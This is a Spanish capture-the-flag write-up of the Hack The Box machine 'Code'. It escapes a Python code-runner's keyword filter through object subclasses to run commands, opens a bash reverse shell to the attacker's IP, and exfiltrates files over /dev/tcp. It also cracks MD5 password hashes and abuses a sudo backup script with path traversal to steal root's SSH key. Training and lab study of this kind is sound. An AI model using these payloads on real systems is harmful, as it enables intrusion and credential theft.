---
title: Code - Easy (HTB)
permalink: /Code-HTB-Writeup/
tags:
  - "Linux"
  - "Easy"
  - "Python"
  - "Bypass"
  - "Command Execution"
  - "Sandbox Escape"
  - "SQLite"
  - "Hash Cracking"
  - "Sudoers"
  - "Path Traversal"
  - "protected_regular"
categories:
  - writeup
  - hacking
  - hackthebox
toc: true
toc_label: Topics
toc_sticky: true
sidebar:
  - main
seo_tittle: Code - Easy (HTB)
seo_description: Evade restricciones en un intérprete de Python utilizando módulos pre-cargados y abusa de privilegios Sudoers para vencer Code.
excerpt: Evade restricciones en un intérprete de Python utilizando módulos pre-cargados y abusa de privilegios Sudoers para vencer Code.
header:
  overlay_image: /assets/images/headers/code-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/code-hackthebox.jpg
---


![image-center](/assets/images/posts/code-hackthebox.png)
{: .align-center}

**Habilidades:** Python Sandbox Escape - No Builtins Modules, SQLite Database Analysis, Hash Cracking, Abusing `bash` Script - Sudoers Privileges, Path Traversal
{: .notice--primary}

# Introducción

Code es una máquina Linux de dificultad `Easy` en la que debemos vulnerar un servicio web que ofrece la funcionalidad de interpretar código `python`. Para ello utilizaremos módulos previamente cargados con el find de eludir restricciones, abusaremos de privilegios a nivel de `sudoers` en un script de `bash` realizando Path Traversal para vencer Code. Adicionalmente entenderemos el mecanismo `protected_regular` en Linux a raíz de un conflicto de permisos en un directorio de escritura global. 
<br>

# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c1 10.10.11.62
PING 10.10.11.62 (10.10.11.62) 56(84) bytes of data.
64 bytes from 10.10.11.62: icmp_seq=1 ttl=63 time=148 ms

--- 10.10.11.62 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 147.780/147.780/147.780/0.000 ms
~~~


## Nmap Scanning 

Realizaremos un escaneo de puertos con el propósito de identificar puertos abiertos en la máquina víctima

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.62 -oG openPorts 

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-11 00:16 EDT
Nmap scan report for 10.10.11.62
Host is up (0.22s latency).
Not shown: 64841 closed tcp ports (reset), 692 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 17.04 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Haremos un escaneo que realice un pequeño reconocimiento a los servicios que hemos descubierto

~~~ bash
nmap -p 22,5000 -sVC 10.10.11.62 -oN services

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-11 00:17 EDT
Nmap scan report for 10.10.11.62
Host is up (0.23s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-title: Python Code Editor
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.29 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal


## Web Analysis - Port `5000`

Vemos que existe un servicio web ejecutándose en el puerto `5000`. Al navegar hasta éste, veremos la siguiente web que parece ser un intérprete de código `python`

![image-center](/assets/images/posts/code-web-analysis.png)
{: .align-center}
<br>


# Intrusión / Explotación
---
## (Failed) Reverse Shell

Si intentamos ejecutar una conexión hacia nuestra máquina, nos aparecerá un mensaje indicando el uso de palabras restringidas

![image-center](/assets/images/posts/code-rev-shell-failed.png)
{: .align-center}

 > Las siguientes palabras están restringidas:
 > 
 > `eval, exec, import, open, os, read, system, write, subprocess, __import__, __ builtins__`
{: .notice--danger}

Si interceptamos las solicitudes HTTP, veremos que se envía el código al servidor a través de un parámetro `code` realizando una solicitud POST

~~~ http
POST /run_code HTTP/1.1
Host: 10.10.11.62:5000
...
...
...
code=print("Hello World")
~~~

 
## Python Sandbox Escape - No Builtins Modules

Como no podemos usar ciertas palabas, buscaremos una forma de ejecutar comandos en el servidor mediante el uso indirecto de módulos disponibles que se encuentren cargados en la memoria. Podemos ver detalles en el uso de esta técnica en el siguiente artículo de [`HackTricks`](https://hacktricks.boitatech.com.br/misc/basic-python/bypass-python-sandboxes#no-builtins)

> En `python`, todas las clases o subclases en ejecución heredan de `object`, esta es la raíz de la jerarquía de clases
{: .notice--info}

Comenzaremos enumerando todas las subclases cargadas en la memoria, para esto utilizaremos la siguiente línea de código

~~~ bash
().__class__.__bases__[0].__subclasses__()

# Alternativa
object.__subclasses__()
~~~

Esto mostrará todas las subclases disponibles, nuestro objetivo es buscar alguna que nos ayude a ejecutar comandos, tales como `os.system` o `subprocess.Popen`

![image-center](/assets/images/posts/code-sandbox-escape.png)
{: .align-center}

Intentaremos ver las subclases cargadas dentro del contexto actual con el siguiente comando, en este caso, encontraremos `sbuprocess`

~~~ bash
curl -sX POST http://10.10.11.62:5000/run_code -d "code=print(object.__subclasses__())" | tr ',' '\n' | grep subprocess

 <class 'subprocess.CompletedProcess'>
 <class 'subprocess.Popen'>
 <class 'asyncio.subprocess.Process'>
~~~

> `subprocess.Popen()` es una función dentro de `python` que nos permite ejecutar cualquier comando en el sistema a través de la creación de un proceso secundario.
{: .notice--info}

El siguiente código busca el valor índice de la función `Popen`

> Nota cómo aprovechamos la concatenación para romper la palabra `Popen` en `'Po' + 'Pen'` y así evitar el filtro de palabras restringidas
{: .notice--warning}

~~~ python
po_pen = 'Po' + 'pen'

for i, cls in enumerate(().__class__.__bases__[0].__subclasses__()):
    if cls.__name__ == po_pen:
        print(i, cls)
~~~

Este código debería retornar el índice donde se encuentra la función `Popen()`

~~~ bash
curl -sX POST http://10.10.11.62:5000/run_code -d "code=po_pen+%3D+'Po'+%2B+'pen'%0A%0Afor+i%2C+cls+in+enumerate(object.__subclasses__())%3A%0A++++if+cls.__name__+%3D%3D+po_pen%3A%0A++++++++print(i%2C+cls)"

{"output":"317 <class 'subprocess.Popen'>\n"}
~~~

### Command Execution Without `subprocess.Popen()`

A modo de prueba, ejecutaremos un `ping` a nuestra máquina atacante. Comenzaremos escuchando tráfico ICMP por la interfaz `tun0`

~~~ bash
tcpdump -i tun0 icmp
~~~

Al ejecutar la siguiente línea, utilizamos el **valor del índice** para llamar a la función directamente, enviando los parámetros necesarios

~~~ python
object.__subclasses__()[317](['ping', '-c', '1', '10.10.14.188'])
~~~

- `[317]`: Accede al índice `317`, allí se encuentra la función `Popen()` 
- `(['ping', ...])`: Instanciamos la clase llamando a la función y enviando los argumentos necesarios

También podemos hacerlo de la siguiente manera

~~~ bash
().__class__.__bases__[0].__subclasses__()[317](['ping', '-c', '1', '10.10.14.188'])
~~~

De ambas formas logramos ejecutar el comando en el sistema como si lo hiciéramos importando el módulo `subprocess`

~~~ python
import subprocess
subprocess.Popen(['ping', '-c', '1', '10.10.14.188'])
~~~

Desde nuestra máquina atacante recibiremos la traza ICMP al enviar la solicitud

~~~ bash
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
13:45:03.969532 IP 10.10.11.62 > 10.10.14.188: ICMP echo request, id 2, seq 1, length 64
13:45:03.969546 IP 10.10.14.188 > 10.10.11.62: ICMP echo reply, id 2, seq 1, length 64
~~~


## Shell as `app-production`

El siguiente código `python` nos debería otorgar una consola como el usuario `app-production`, haciendo uso de `Popen()`

~~~ python
().__class__.__bases__[0].__subclasses__()[317](['bash', '-c', 'bash -i >& /dev/tcp/10.10.14.188/443  0>&1'])
~~~

> Antes de enviar el código anterior, recuerda iniciar un listener con `netcat` por el puerto que elegiste en el payload
{: .notice--danger}

~~~ bash
nc -lvnp 443
~~~

También podemos enviar una solicitud POST mediante `curl`

~~~ bash
curl -sX POST http://10.10.11.62:5000/run_code -d "code=().__class__.__bases__%5B0%5D.__subclasses__()%5B317%5D(%5B'bash'%2C+'-c'%2C+'bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.188%2F443++0%3E%261'%5D)"
~~~

En nuestra máquina recibiremos una consola como el usuario `app-production`

~~~ bash
nc -lvnp 443 
listening on [any] 443 ...
connect to [10.10.14.188] from (UNKNOWN) [10.10.11.62] 54930
bash: cannot set terminal process group (2598): Inappropriate ioctl for device
bash: no job control in this shell
app-production@code:~/app$  
~~~


## TTY Treatment

Haremos un tratamiento de la TTY para contar con una consola más interactiva, en la que podamos navegar y hacer `Ctrl+C` sin que la shell nos diga "hasta la próxima..."

~~~ bash
app-production@code:~/app$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
app-production@code:~/app$ ^Z
[1]  + 341683 suspended  nc -lvnp 443
root@parrot nmap # stty raw -echo; fg       
[1]  + 341683 continued  nc -lvnp 443
                                     reset xterm
~~~ 

Cambiaremos el valor de la variable de entorno `TERM` para poder limpiar la pantalla con `Ctrl+L`

~~~ bash
app-production@code:~/app$ export TERM=xterm
app-production@code:~/app$ stty rows 44 columns 184
~~~

Ya podremos ver la flag del usuario sin privilegios, se encuentra un directorio atrás

~~~ bash
app-production@code:~/app$ cd
app-production@code:~$ cat user.txt 
b84...
~~~
<br>


# Escalada de Privilegios
---
## Finding Privilege Escalation Path

En este punto debemos encontrar la forma de escalar nuestros privilegios en la máquina, ya que el usuario `app-production` no es un usuario privilegiado, podemos intentar diversas técnicas manuales, como enumerar privilegios del usuario, permisos de archivos, binarios SUID, capabilities, etc.

### Users

Existe un usuario llamado `martin`, posiblemente debamos convertirnos en ese usuario en algún momento

~~~ bash
app-production@code:~/app$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
app-production:x:1001:1001:,,,:/home/app-production:/bin/bash
martin:x:1000:1000:,,,:/home/martin:/bin/bash
~~~

### Sudoers Privileges

Comúnmente se listan los privilegios que podamos tener configurados dentro del archivo `/etc/sudoers`, aunque muy probablemente se requiera contraseña

~~~ bash
app-production@code:~/app$ sudo -l
[sudo] password for app-production: 
Sorry, try again.
~~~

### SUID Binaries

Otra técnica básica consiste en enumerar permisos `suid` en binarios, los cuales podamos utilizar para ejecutar algún comando como `root`, quien debe ser propietario de estos ejecutables 

~~~ bash
app-production@code:~/app$ find / -perm -4000 2>/dev/null
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/umount
/usr/bin/at
/usr/bin/su
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/chfn
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
~~~

Esta lista de binarios no representa una vía potencial para escalar nuestros privilegios, por lo que seguiremos enumerando el sistema


## SQLite Database Analysis

Nos encontramos en el directorio donde se aloja la web, podemos intentar aprovechar recursos disponibles dentro de este directorio. Podemos listar recursivamente archivos con el comando `find` aplicando un filtro de archivos con `-type f`

~~~ bash
app-production@code:~/app$ find . -type f
./app.py
./static/css/styles.css
./templates/index.html
./templates/codes.html
./templates/register.html
./templates/login.html
./templates/about.html
./database.db
./__pycache__/app.cpython-38.pyc
./instance/database.db
~~~

Vemos que existe un archivo SQLite 3, que corresponde a un archivo de base de datos

~~~ bash
app-production@code:~/app$ file instance/database.db
instance/database.db: SQLite 3.x database, last written using SQLite version 3031001
~~~ 

### File Transfer

Para analizar este archivo de forma más cómoda, podemos transferir este archivo de base de datos a nuestra máquina atacante. Pondremos un puerto a la escucha para recibir el contenido del archivo `database.db`

~~~ bash
nc -lvnp 4444 > database.db
~~~

Desde la máquina víctima iniciamos un socket TCP que será el canal de comunicación con nuestra máquina, simplemente hacemos `cat` y redirigimos la salida a la ruta especial `/dev/tcp`

~~~ bash
app-production@code:~/app$ cat instance/database.db > /dev/tcp/10.10.14.187/4444
~~~

Podemos verificar la integridad del archivo calculando su hash MD5 en ambas máquinas (atacante y víctima). Ambos hashes deben coincidir, de lo contrario indicaría un error en la transferencia

~~~ bash
md5sum database.db                                   
d0d91c72ba4889ef333414f3f07964a4  database.db

app-production@code:~/app$ md5sum instance/database.db 
d0d91c72ba4889ef333414f3f07964a4  instance/database.db
~~~

Enumerando rápidamente la base de datos, podemos ver información sobre usuarios, donde vemos el nombre de usuario además de contraseñas en formato hash

~~~ bash
sqlite3 database.db '.tables' 
code  user

sqlite3 database.db 'select * from user' -table 
+----+-------------+----------------------------------+
| id |  username   |             password             |
+----+-------------+----------------------------------+
| 1  | development | 759b74ce43947f5f4c91aeddc3e5bad3 |
| 2  | martin      | 3de6f30c4a09c27fc71932bfc68474be |
+----+-------------+----------------------------------+
~~~


## Hash Cracking

Es muy probable que el formato sea MD5 por la salida que nos muestra `hashid` y por los caracteres utilizados (`a-f` y `0-9` o hexadecimal)

~~~ bash
hashid '759b74ce43947f5f4c91aeddc3e5bad3'                                                                          
Analyzing '759b74ce43947f5f4c91aeddc3e5bad3'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 
[+] Skype 
[+] Snefru-128 
[+] NTLM 
[+] Domain Cached Credentials 
[+] Domain Cached Credentials 2 
[+] DNSSEC(NSEC3) 
[+] RAdmin v2.x 
~~~

Guardaremos rápidamente los hashes en un archivo para intentar crakearlos con alguna herramienta como `john`

~~~ bash
sqlite3 database.db 'select * from user' | cut -d '|' -f3-3 > hashes.txt
~~~

Emplearemos un diccionario de contraseñas posibles para intentar comprobar si la contraseña es vulnerable forma parte de este listado. Además necesitaremos especificar el formato de los hashes 

~~~ bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
development      (?)     
nafeelswordsmaster (?)     
2g 0:00:00:00 DONE (2025-08-02 14:25) 4.878g/s 12748Kp/s 12748Kc/s 13244KC/s nafi1993..naerox
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
~~~

Disponemos de las siguientes credenciales para intentar conectarnos a la máquina

~~~ bash
development:development
martin:nafeelswordsmaster
~~~


## Shell as `martin`

Podremos conectarnos como el usuario `martin` a través del protocolo `ssh`

~~~ bash
ssh martin@10.10.11.62                             

martin@10.10.11.62\'s password:
Last login: Thu Jul 10 21:50:18 2025 from 10.10.14.188
martin@code:~$
~~~

Cambiaremos el valor de la variable de entorno `TERM` para poder limpiar la pantalla con `Ctrl+L`

~~~ bash
martin@code:~$ exeport TERM
~~~


## Interesting Files

Dentro del directorio `backups` que está en el directorio del usuario `martin`, veremos los siguientes archivos

~~~ bash
martin@code:~/backups$ ll
total 20
drwxr-xr-x 2 martin martin 4096 Apr  8 11:50 ./
drwxr-x--- 6 martin martin 4096 Apr  8 11:50 ../
-rw-r--r-- 1 martin martin 5879 Apr  8 11:50 code_home_app-production_app_2024_August.tar.bz2
-rw-r--r-- 1 martin martin  181 Apr  8 11:50 task.json

martin@code:~/backups$ cat task.json 
{
	"destination": "/home/martin/backups/",
	"multiprocessing": true,
	"verbose_log": false,
	"directories_to_archive": [
		"/home/app-production/app"
	],

	"exclude": [
		".*"
	]
}
~~~


## Abusing `bash` Script - Sudoers Privileges

Listando privilegios `sudo` podremos ver que tenemos la capacidad de ejecutar un script de bash sin necesidad de proporcionar contraseña

~~~ bash
martin@code:~$ sudo -l
Matching Defaults entries for martin on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
~~~

Este script pertenece al usuario `root` y puede representar una vía potencial para escalar privilegios dependiendo de su comportamiento

~~~ bash
martin@code:~/backups$ ls -l /usr/bin/backy.sh
-rwxr-xr-x 1 root root 926 Sep 16  2024 /usr/bin/backy.sh
~~~

Analizaremos este script en busca de alguna vulnerabilidad que nos permita ejecutar comandos en su ejecución

~~~ bash
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
     if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
~~~


## Path Traversal

El script toma la ruta definida en un archivo `.json` desde el campo `directories_to_archive`, eliminando los intentos de Path Traversal (`../`). Además, es necesario que la ruta sea `/home` o `/var` .

Si modificamos el archivo `task.json` para realizar una pequeña prueba, comprobaremos cómo se mitiga un intento de Path Traversal (mira la diferencia cuando ejecutamos el comando que usa el script para sanitizar la ruta)

~~~ bash
martin@code:~/backups$ cat task.json 
{
	"destination": "/home/martin/backups/",
	"multiprocessing": true,
	"verbose_log": false,
	"directories_to_archive": [
		"/home/../../root"
	],

	"exclude": [
		".*"
	]
}

martin@code:~/backups$ jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' task.json
{
  "destination": "/home/martin/backups/",
  "multiprocessing": true,
  "verbose_log": false,
  "directories_to_archive": [
    "/home/root"
  ],
  "exclude": [
    ".*"
  ]
}
~~~

Haremos una copia del archivo `task.json` para evitar que el `cleanup` lo modifique la realizar cambios en él

~~~ bash
martin@code:~/backups$ cp task.json /tmp/task.json
martin@code:~/backups$ pushd /tmp
/tmp ~/backups
~~~

Modificaremos el directorio a archivar para intentar eludir esta validación y realizar Path Traversal

~~~ bash
martin@code:/tmp$ cat task.json | grep directories -A 1
	"directories_to_archive": [
		"/home/....//root/.ssh"

# Al aplicar la validación, no se logran eliminar todos los caracteres
martin@code:/tmp$ jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' task.json | grep directories -A 1
  "directories_to_archive": [
    "/home/../root/.ssh"
~~~

### Exploiting

Modificaremos el archivo `.json` para que luzca de la siguiente manera. Intentaremos archivar el directorio `.ssh` del usuario `root`

~~~ bash
{
  "destination": "/home/martin/backups/",
  "multiprocessing": true,
  "verbose_log": false,
  "directories_to_archive": [
    "/home/../root/.ssh"
  ],
  "exclude": []
}
~~~

Al ejecutar el script con el archivo `.json` modificado, vemos que se genera un nuevo archivo `.tar.bz2`

~~~ bash
martin@code:~/backups$ sudo /usr/bin/backy.sh task.json 
2025/08/02 20:23:23 🍀 backy 1.2
2025/08/02 20:23:23 📋 Working with test.json ...
2025/08/02 20:23:23 💤 Nothing to sync
2025/08/02 20:23:23 📤 Archiving: [/home/../root/.ssh]
2025/08/02 20:23:23 📥 To: /home/martin/backups ...
2025/08/02 20:23:23 📦
~~~

Iniciaremos un listener en nuestra máquina para recibir el archivo `.tar.bz2`

~~~ bash
nc -lvnp 4444 > ssh-root.tar.bz2
~~~

Enviaremos este archivo generado a nuestra máquina atacante a través de un socket TCP

~~~ bash
martin@code:~/backups$ cat code_home_.._root_.ssh_2025_August.tar.bz2 > /dev/tcp/10.10.14.188/4444
~~~

En nuestra máquina de forma inmediata recibiremos el archivo, recordemos que podemos verificar la integridad de éste con el comando `md5sum`

~~~ bash
nc -lvnp 4444 > ssh-root.tar.bz2
listening on [any] 4444 ...
connect to [10.10.14.188] from (UNKNOWN) [10.10.11.62] 38048
~~~


## Root Time

Descomprimiremos el archivo para ver su contenido, veremos el archivo de clave privada de `root`

~~~ bash
bzip2 -d ssh-root.tar.bz2
tar -xf ssh-root.tar
cd root/.ssh 

ls    
authorized_keys  id_rsa
~~~

Utilizaremos la clave privada de `root` para conectarnos sin proporcionar contraseña

~~~ bash
ssh root@10.10.11.62 -i id_rsa

root@code:~# id
uid=0(root) gid=0(root) groups=0(root)
~~~

Por último nos quedaría leer la flag ubicada dentro del directorio `/root`

~~~ bash
root@code:~# cat root.txt  
532...
~~~
<br>


## Bonus: Understanding `protected_regular`

Ocurre algo extraño cuando usamos el script `backy.sh` con un archivo `task.json` que guardamos en directorios como `/dev/shm` o `/tmp` (`world-writable` o de escritura global)

~~~ bash
martin@code:/tmp$ cat task.json 
{
	"destination": "/home/martin/backups/",
	"multiprocessing": true,
	"verbose_log": false,
	"directories_to_archive": [
		"/home/....//root/.ssh"
	],

	"exclude": [
	]
}
~~~

Al ejecutar el script como `root` todo fallará por un conflicto de permisos

~~~ bash
martin@code:/tmp$ sudo /usr/bin/backy.sh task.json 
/usr/bin/backy.sh: line 19: task.json: Permission denied
2025/08/03 01:57:16 🍀 backy 1.2
2025/08/03 01:57:16 📋 Working with task.json ...
2025/08/03 01:57:16 💤 Nothing to sync
2025/08/03 01:57:16 📤 Archiving: [/home/....//root/.ssh]
2025/08/03 01:57:16 📥 To: /home/martin/backups ...
2025/08/03 01:57:16 📦
2025/08/03 01:57:16 💢 Archiving failed for: /home/....//root/.ssh
2025/08/03 01:57:16 ❗️ Archiving completed with errors
~~~

La línea `19` del script `backy.sh` intenta sobrescribir el archivo al redirigir la salida, y aquí es cuando se ocasiona el error

~~~ bash
martin@code:/tmp$ cat /usr/bin/backy.sh | sed -n '19p'
/usr/bin/echo "$updated_json" > "$json_file"
~~~

### Theory

El conflicto es ocasionado por [`protected_regular`](https://docs.kernel.org/admin-guide/sysctl/fs.html#protected-regular), el cual es un mecanismo de seguridad en Linux para evitar escrituras de archivos en directorios `sticky` y de escritura global.

> `0`: **Desactivado**. Sin restricciones.
> 
> `1`: **Restringe escrituras** con `O_CREAT` en archivos regulares existentes que **no pertenecen al usuario**, si están en directorios `world-writable` y `sticky`, como `/tmp` o `/dev/shm`. Excepto si el archivo lo creó el dueño del directorio.
> 
> `2`: Igual que `1`, pero también aplica a directorios `group-writable` y `sticky`.
{: .notice--info}

> [`O_CREAT`](https://manpages.ubuntu.com/manpages/trusty/es/man2/open.2.html): Si el fichero no existe, será creado. El propietario (identificador de usuario)  del  fichero se fija al identificador de usuario efectivo del proceso.
{: .notice--info}

> [`Sticky Bit`](linuxopsys.com/sticky-bit-in-linux): Es un permiso especial en sistemas Unix y Linux que, aplicado a un directorio, restringe la eliminación o modificación de archivos dentro de ese directorio solo al propietario del archivo, al propietario del directorio o al usuario root.
{: .notice--info}

### Practice

Podemos comprobar esta opción desde una sesión con privilegios

~~~ bash
root@code:~# cat /proc/sys/fs/protected_regular
2

root@code:~# sysctl fs.protected_regular
fs.protected_regular = 2
~~~

Entendiendo esto, si intentamos aplicar la teoría aprendida cambiando el propietario del archivo `task.json`

~~~ bash
root@code:/tmp# chown root:root task.json 
~~~

Ahora el archivo `task.json` ya pertenece al usuario `root`, por lo que ya no deberíamos experimentar el mismo problema

~~~ bash
martin@code:/tmp$ ll
total 12
drwxrwxrwt  2 root root 4096 Aug  3 03:24 ./
drwxr-xr-x 18 root root 4096 Feb 24 19:44 ../
-rw-r--r--  1 root root  184 Aug  3 03:24 task.json
~~~

Al ejecutarlo, deberíamos ver el archivo `.tar.bz2` generado correctamente y con los respectivos archivos

~~~ bash
martin@code:/tmp$ sudo /usr/bin/backy.sh task.json 
2025/08/03 03:24:42 🍀 backy 1.2
2025/08/03 03:24:42 📋 Working with task.json ...
2025/08/03 03:24:42 💤 Nothing to sync
2025/08/03 03:24:42 📤 Archiving: [/home/../root/.ssh]
2025/08/03 03:24:42 📥 To: /home/martin/backups ...
2025/08/03 03:24:42 📦

martin@code:/tmp$ tar -tf ~/backups/code_home_.._root_.ssh_2025_August.tar.bz2 
root/.ssh/
root/.ssh/id_rsa
root/.ssh/authorized_keys
~~~
<br>
Gracias por leer este artículo, espero te haya sido de ayuda. Te dejo la cita del día:

> Do more than dream: work.
> — William Arthur Ward
{: .notice--info}
